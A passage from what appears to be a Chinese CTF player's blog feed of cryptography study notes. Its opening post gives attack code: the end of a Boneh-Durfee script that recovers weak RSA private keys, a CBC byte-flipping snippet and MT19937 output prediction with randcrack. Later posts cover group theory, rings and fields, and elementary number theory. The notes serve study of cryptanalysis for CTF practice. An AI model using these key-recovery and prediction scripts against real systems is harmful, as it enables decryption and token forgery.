P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+1)/2)</span><br><span class="line">    pol = 1 + x * (A + y)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== checking values ===&quot;)</span><br><span class="line">        print (&quot;* delta:&quot;, delta)</span><br><span class="line">        print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span><br><span class="line">        print (&quot;* size of e:&quot;, int(log(e)/log(2)))</span><br><span class="line">        print (&quot;* size of N:&quot;, int(log(N)/log(2)))</span><br><span class="line">        print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== running algorithm ===&quot;)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"> </span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line">    if solx &gt; 0:</span><br><span class="line">        print (&quot;=== solution found ===&quot;)</span><br><span class="line">        if False:</span><br><span class="line">            print (&quot;x:&quot;, solx)</span><br><span class="line">            print (&quot;y:&quot;, soly)</span><br><span class="line"> </span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print (&quot;private key found:&quot;, d)</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;=== no solution was found ===&quot;)</span><br><span class="line"> </span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))</span><br><span class="line">    return d</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    c =</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    delta = 0.28 # this means that d &lt; N^delta</span><br><span class="line">    d = example(n,e,delta)</span><br><span class="line">    print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p>参考<a href="https://blog.csdn.net/xiongsiqi_blog/article/details/131925246">这篇文章</a></p><p>用于CBC模式下的AES加密</p><p>个人认为上面的文章中这一段讲得已经很清楚了</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/image-20240721165239569.png" alt="image-20240721165239569"></p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a1, a2</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1,b2 <span class="keyword">in</span> <span class="built_in">zip</span>(a1,a2)])</span><br><span class="line">A=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">C=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">CC=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">AA=strxor(A,C)</span><br><span class="line">AA=strxor(AA,CC)</span><br><span class="line"><span class="built_in">print</span>(AA)</span><br></pre></td></tr></table></figure><h2 id="MT19937伪随机数预测"><a href="#MT19937伪随机数预测" class="headerlink" title="MT19937伪随机数预测"></a>MT19937伪随机数预测</h2><p>MT19937，即梅森旋转算法，是一种伪随机数的生成算法，python中的random模块生成“随机数”时使用的就是这种算法。</p><p>根据其原理，有一个叫randcrack的python模块可以对其生成的“随机数”进行预测，前提是需要已知已经生成的至少624个32位二进制数，这样才能预测出下一个生成的数会是多少。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand=[] <span class="comment">#624个32位二进制数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(Rand[i])</span><br><span class="line">pre=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(pre)</span><br></pre></td></tr></table></figure><p>那么前面给出的是312个64位数呢？</p><p>其实，random生成64位数的方式就是先生成2个32位数，然后将它们拼起来得到的。因此我们只需要把这个64位数拆开成两个32位数即可。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand= [] <span class="comment">#312个64位数</span></span><br><span class="line">prng=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Rand:</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&amp; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>))</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&gt;&gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(prng[i])</span><br><span class="line">notrandom=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(notrandom)</span><br></pre></td></tr></table></figure><h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>参考<a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">这篇文章</a>和<a href="https://blog.csdn.net/superprintf/article/details/108964563">这篇文章</a></p><p>LCG，线性同余法，是一种生成伪随机数的方法，用一个公式来概括就是<br>$$<br>X_{n+1}&#x3D;(aX_n+b)\ mod\ m<br>$$<br>基本围绕以下四个公式，即可解决各类基础的LCG问题</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/c00bad18-4f1e-4719-81d0-526a8db7030c.png" alt="c00bad18-4f1e-4719-81d0-526a8db7030c"></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础散记</title>
      <link href="/posts/456e3691/"/>
      <url>/posts/456e3691/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些遇到的密码学相关知识<del>（当裁缝）</del></p></blockquote><h2 id="威尔逊定理"><a href="#威尔逊定理" class="headerlink" title="威尔逊定理"></a>威尔逊定理</h2><p>任一素数减去1的阶乘与-1模该素数同余。即对于任何素数p，都有<br>$$<br>(p-1)!+1\equiv 0(mod\ p)<br>$$</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设p是素数，f(x)是整系数多项式，再设a1,a2,…,an两两对模不同余，满足<br>$$<br>f(a_j)\equiv 0(mod\ p),1\leq j\leq n<br>$$<br>则存在整系数多项式q(x)，使得<br>$$<br>f(x)\equiv q(x)(x-a_1)(x-a_2)…(x-a_n)(mod\ p)<br>$$<br>由此可进一步推知，<br>$$<br>x^{p-1}-1\equiv (x-1)…(x-p+1)(mod\ p)<br>$$</p><h2 id="群论"><a href="#群论" class="headerlink" title="群论"></a>群论</h2><p>参考了百度百科和<a href="https://blog.csdn.net/chenxy_bwave/article/details/122702319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170972835316800226592151%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170972835316800226592151&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122702319-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%BE%A4%E8%AE%BA&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="二元运算"><a href="#二元运算" class="headerlink" title="二元运算"></a>二元运算</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205145595.png" alt="image-20240306205145595"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205505241.png" alt="image-20240306205505241"></p><h3 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306210708812.png" alt="image-20240306210708812"></p><h3 id="阿贝尔群"><a href="#阿贝尔群" class="headerlink" title="阿贝尔群"></a>阿贝尔群</h3><p>若一个群满足交换律，则称其为阿贝尔群，也称为交换群。</p><h3 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h3><p>设(M,<em>)和(S,·)是两个群，σ:M→S，∀a,b∈M，有σ(a</em>b)&#x3D;σ(a)·σ(b)，则称σ为M到S的同态或群映射。</p><p>也就是说，先运算再映射和先映射再运算得到的结果相等。</p><p>如果为单射，则称为单同态。</p><h3 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h3><p>如果一个同态映射可逆（双射），则称这两个群同构。</p><h3 id="半群"><a href="#半群" class="headerlink" title="半群"></a>半群</h3><p>只满足定义中的1、2两条</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><p>当模m有原根时，设l为模m的一个原根，则当x&#x3D;l^k mod m时，<br>$$<br>Ind_lx\equiv k(mod\ \phi(m))<br>$$<br>离散对数和一般的对数有着相类似的性质：<br>$$<br>Ind_lxy\equiv Ind_lx+Ind_ly(mod\ \phi(m))<br>$$</p><p>$$<br>Ind_lx^y\equiv yInd_lx(mod\ \phi(m))<br>$$</p><p>在程序中，我们可以用sympy库中的discrete_log函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">x=</span><br><span class="line">y=</span><br><span class="line">z=</span><br><span class="line">e=sympy.discrete_log(x,y,z)  <span class="comment">##求e，discrete_log(x,y,z)，x为模，y为余数，z为底数 </span></span><br></pre></td></tr></table></figure><h2 id="环和域"><a href="#环和域" class="headerlink" title="环和域"></a>环和域</h2><p>需要结合上面说到的群论来看，参考了这篇文章](<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142^v99^pc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187</a>)</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204549987.png" alt="image-20240307204549987"></p><h3 id="交换环-含幺环-交换含幺环"><a href="#交换环-含幺环-交换含幺环" class="headerlink" title="交换环 含幺环 交换含幺环"></a>交换环 含幺环 交换含幺环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204829672.png" alt="image-20240307204829672"></p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205000778.png" alt="image-20240307205000778"></p><h3 id="无零因子环和含零因子环"><a href="#无零因子环和含零因子环" class="headerlink" title="无零因子环和含零因子环"></a>无零因子环和含零因子环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205056700.png" alt="image-20240307205056700"></p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205356769.png" alt="image-20240307205356769"></p><p>在有限含幺环中，无零因子等同于(非零元)有逆元。</p><h3 id="整环（整区）"><a href="#整环（整区）" class="headerlink" title="整环（整区）"></a>整环（整区）</h3><p>交换含幺的无零因子环称为整环。</p><h3 id="除环"><a href="#除环" class="headerlink" title="除环"></a>除环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205340140.png" alt="image-20240307205340140"></p><p>除环是含幺的无零因子环。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>接上面的环，参考了百度百科和<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205839086.png" alt="image-20240307205839086"></p><p>可以说，可交换的除环是域，或有限整环是域</p><p>百度百科上的描述也不错</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307211359034.png" alt="image-20240307211359034"></p><h3 id="有限域（伽罗瓦域）"><a href="#有限域（伽罗瓦域）" class="headerlink" title="有限域（伽罗瓦域）"></a>有限域（伽罗瓦域）</h3><p>如果域F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶。有限域的特征数必为某一素数p，因此它含的素域同构于Zp。若F是特征为p的有限域，则F中元素的个数为pⁿ,n为某一正整数。元素个数相同的有限域是同构的。因此，通常用GF(pⁿ)表示pⁿ元的有限域。GF(pⁿ)的乘法群是(pⁿ-1)阶的循环群。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qsnCTF2024 Round1 Writeup</title>
      <link href="/posts/42fc2477/"/>
      <url>/posts/42fc2477/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/qsnCTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“小光的答案之书” in “Misc” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> qsnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《初等数论》学习笔记</title>
      <link href="/posts/b974d0b6/"/>
      <url>/posts/b974d0b6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从今天开始，不间断地更新一些《初等数论》学习笔记，简单打一下密码学的基础<del>（为了密码学不爆零T0T）</del></p></blockquote><h2 id="第一章-整数的整除性"><a href="#第一章-整数的整除性" class="headerlink" title="第一章 整数的整除性"></a>第一章 整数的整除性</h2><h3 id="gcd-a-b-gcd-b-r"><a href="#gcd-a-b-gcd-b-r" class="headerlink" title="gcd(a,b)&#x3D;gcd(b,r)"></a>gcd(a,b)&#x3D;gcd(b,r)</h3><p>假设a和b都是整数，且a&gt;b</p><p><strong>a&#x3D;bq+r</strong>, 0&lt;r&lt;b</p><p>其中q和r都是正整数，则a和b的最大公因数等于b和r的最大公因数，即</p><p><strong>gcd(a,b) &#x3D; gcd(b,r)</strong></p><h3 id="欧几里得算法（辗转相除法）"><a href="#欧几里得算法（辗转相除法）" class="headerlink" title="欧几里得算法（辗转相除法）"></a>欧几里得算法（辗转相除法）</h3><p>利用上述性质，我们可以用欧几里得算法来求两个较大数的最大公因数。用语言通俗地表达，就是先用较大数除以较小数，然后用上一个式子的除数除以上一个式子的余数，如此反复至余数为0，最后一个式子的除数即为最大公因数。</p><p>百度百科中的这张图较好地解释了其中原理：</p><img src="/images/《初等数论》学习笔记/辗转相除.webp" alt="辗转相除" style="zoom:50%;" /><p>下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><p>看书上都没有讲，但是也很重要，这里补充一下。</p><p>这个算法在用辗转相除法找到gcd(a,b)的前提下，还能找到x,y，使得ax+by&#x3D;gcd(a,b)。（根据贝祖&#x2F;裴蜀定理，x和y总是存在）</p><p>具体原理引用这篇文章来讲<a href="https://blog.csdn.net/qq_37701948/article/details/132716594">https://blog.csdn.net/qq_37701948/article/details/132716594</a></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240224212552584.png" alt="image-20240224212552584"></p><p>如此可以得到欧几里得算法中前后两步之间x和y的关系，已知最后一步时b&#x3D;0，于是可以以此倒推出原来的x和y，下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):     </span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a     </span><br><span class="line">    <span class="keyword">else</span>:         </span><br><span class="line">        x, y, q = ext_euclid(b, a % b) </span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)         </span></span><br><span class="line">        x, y = y, (x - (a // b) * y)         </span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure><p>特别地，当a和b互素的时候，gcd(a,b)&#x3D;1，因此要求的就是能使ax+by&#x3D;1成立的x和y。这里的x其实就是a的模反元素（模逆元），在RSA解密中有着重要作用，以后的文章中再做详细的描述。</p><h3 id="ab-dm"><a href="#ab-dm" class="headerlink" title="ab&#x3D;dm"></a>ab&#x3D;dm</h3><p>假设a和b都是正整数，a和b的最大公因数是d而a和b的最小公倍数是m，即(a,b)&#x3D;d而{a,b}&#x3D;m，则我们有</p><p>ab&#x3D;dm</p><p>这可以用来更快捷地求出大数的最小公倍数：我们可以先试用欧几里得算法求出最大公因数，所以m&#x3D;ab&#x2F;d</p><h2 id="第二章-数的进位法"><a href="#第二章-数的进位法" class="headerlink" title="第二章 数的进位法"></a>第二章 数的进位法</h2><h3 id="求补码"><a href="#求补码" class="headerlink" title="求补码"></a>求补码</h3><p>对于二进制数(a1a2…an)2，当n≥3时，可用如下方法快速求补码</p><h4 id="当an-1时"><a href="#当an-1时" class="headerlink" title="当an&#x3D;1时"></a>当an&#x3D;1时</h4><p>除an不变，在a1,a2,…an-1中所有ai是0的都变成1，而所有ai是1的都变成0。由这种方法所得到的二进制数就是(a1a2…an)2的补码</p><h4 id="当an-0时"><a href="#当an-0时" class="headerlink" title="当an&#x3D;0时"></a>当an&#x3D;0时</h4><p>在(a1a2…an)2中从右往左看，则在出现1以前所有的0及其第一次出现的1都不变，而后各数遇0变成1，遇1则变成0.用这种方法所得到的二进制数就是(a1a2…an)2的补码。</p><h3 id="利用补码来进行二进制数减法运算"><a href="#利用补码来进行二进制数减法运算" class="headerlink" title="利用补码来进行二进制数减法运算"></a>利用补码来进行二进制数减法运算</h3><p>先求减数的补码，用被减数加上补码再减去减数</p><h2 id="第三章-一部分不定方程"><a href="#第三章-一部分不定方程" class="headerlink" title="第三章 一部分不定方程"></a>第三章 一部分不定方程</h2><h3 id="一元不定方程"><a href="#一元不定方程" class="headerlink" title="一元不定方程"></a>一元不定方程</h3><p>设n≥2，而n,a0,a1,…,an都是整数，求出关于整数系数的n次方程<br>$$<br>a_nx^n+a_{n-1}x^{n-1}+…+a_1x+a_0&#x3D;0<br>$$<br>设x&#x3D;α是其整数解，那么<br>$$<br>a_n\alpha^n+a_{n-1}\alpha^{n-1}+…+a_1\alpha+a_0&#x3D;0<br>$$</p><p>$$<br>a_0&#x3D;-\alpha(a_n\alpha^{n-1}+a_{n-1}\alpha^{n-2}+…+a_1)<br>$$</p><p>所以只要能从a0中挑选出能使原式成立的因数，即为原式的整数解，否则无整数解</p><h3 id="二元一次不定方程"><a href="#二元一次不定方程" class="headerlink" title="二元一次不定方程"></a>二元一次不定方程</h3><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>设二元一次不定方程ax+by&#x3D;c（其中a,b,c都是正整数而gcd(a,b)&#x3D;1，有一组整数解x&#x3D;x0,y&#x3D;y0，则其一切整数解可以表示成<br>$$<br>\begin{cases} x&#x3D;x_0-bt \ y&#x3D;y_0+at \end{cases}<br>$$<br>其中t&#x3D;0,±1,±2,±3,…</p><h4 id="求ax-by-c的一切整数解"><a href="#求ax-by-c的一切整数解" class="headerlink" title="求ax+by&#x3D;c的一切整数解"></a>求ax+by&#x3D;c的一切整数解</h4><p>假设gcd(a,b)&#x3D;1，</p><p>先求ax+by&#x3D;1的解，可利用第一章中所述之扩展欧几里得算法，得到解x&#x3D;x0,y&#x3D;y0.</p><p>所以ax+by&#x3D;c(ax0+by0)，</p><p>所以x&#x3D;cx0,y&#x3D;cy0.</p><p>由上述定理得，x&#x3D;cx0-bt，y&#x3D;cy0+at，其中t&#x3D;0,±1,±2,±3,…</p><p>如果放在实际应用问题中，要记得注意定义域。</p><h3 id="费马大定理"><a href="#费马大定理" class="headerlink" title="费马大定理"></a>费马大定理</h3><p>当n是一个大于2的正整数时，则<br>$$<br>x^n+y^n&#x3D;z^n<br>$$<br>这个不定方程没有正整数解。</p><h2 id="第四章-一次同余式及解法"><a href="#第四章-一次同余式及解法" class="headerlink" title="第四章 一次同余式及解法"></a>第四章 一次同余式及解法</h2><h3 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h3><p>如果a和b都是整数而m是一个固定的正整数，则当m|(a-b)（即m能够整除a-b）时，我们就说a,b对模m同余，记作<br>$$<br>a\equiv b(mod\ m)<br>$$</p><h3 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>当a是整数而m是一个正整数时，则有<br>$$<br>a\equiv a(mod\ m)<br>$$</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>如果a,b都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立时，我们有<br>$$<br>b\equiv a(mod\ m)<br>$$</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>如果a,b,c都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>b\equiv c(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a\equiv c(mod\ m)<br>$$</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a+c\equiv b+d(mod\ m)<br>$$</p><p>$$<br>a-c\equiv b-d(mod\ m)<br>$$</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>如果a,b,c都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，我们有<br>$$<br>ac\equiv bc(mod\ m)<br>$$</p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>ac\equiv bd(mod\ m)<br>$$</p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>如果a,b都是整数，而m和n都是正整数，则当<br>$$<br>a\equiv b(mod m)<br>$$<br>成立时，我们有<br>$$<br>a^n\equiv b^n(mod\ m)<br>$$</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>如果a1,a2,…an,b1,b2,…bn都是整数，而m和n都是正整数，则当<br>$$<br>a_1\equiv b_1(mod\ m)<br>$$</p><p>$$<br>a_2\equiv b_2(mod\ m)<br>$$</p><p>​……<br>$$<br>a_n\equiv b_n(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a_1+a_2+…+a_n\equiv b_1+b_2+…+b_n(mod\ m)<br>$$</p><h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>按照通常方法，把一个正整数a写成十进位数的形式，即<br>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0,0\leq a_i&lt;10<br>$$<br>当9能够整除an+an-1+…+a0时，则我们有9能够整除a</p><h3 id="弃九法"><a href="#弃九法" class="headerlink" title="弃九法"></a>弃九法</h3><p>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0<br>$$</p><p>$$<br>b&#x3D;b_m10^m+b_{m-1}10^{m-1}+…+b_0<br>$$</p><p>$$<br>ab&#x3D;P<br>$$</p><p>$$<br>P&#x3D;c_l10^l+c_{l-1}10^{l-1}+…c_0<br>$$</p><p>由上面的结论，我们可以得到<br>$$<br>a\equiv a_n+a_{n-1}+…+a_0(mod\ 9)<br>$$</p><p>$$<br>b\equiv b_n+b_{n-1}+…+b_0(mod\ 9)<br>$$</p><p>$$<br>P\equiv c_n+c_{n-1}+…+c_0(mod\ 9)<br>$$</p><p>进而得到<br>$$<br>(a_n+a_{n-1}+…+a_0)(b_m+b_{m-1}+…+b_0)\equiv c_l+c_{l-1}+…+c_0(mod\ 9)<br>$$<br>如果an,an-1,…a0,bm,bm-1,…b0,cl,cl-1,…c0中有9出现，可以把9去掉</p><h3 id="一次同余式"><a href="#一次同余式" class="headerlink" title="一次同余式"></a>一次同余式</h3><p>如果a,b都是整数，而m是一个正整数，当a mod m ≠0时，我们把<br>$$<br>ax+b\equiv 0(mod\ m)<br>$$<br>叫做模m的一次同余式</p><h3 id="一些结论-1"><a href="#一些结论-1" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>如果c能使ac+b mod m&#x3D;0成立，则x mod m &#x3D;c的一切整数x都能使其成立，也就是上式的一个解</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>当gcd(a.m)不能够整除b时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>没有整数解</p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>当gcd(a,m)&#x3D;1时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>有整数解</p><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><p>如果ad mod md &#x3D;bd，则有a mod m&#x3D;b</p><img src="/images/《初等数论》学习笔记/image-20240229000118869.png" alt="image-20240229000118869"  /><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229000135048.png" alt="image-20240229000135048"></p><h3 id="孙子定理（中国剩余定理）"><a href="#孙子定理（中国剩余定理）" class="headerlink" 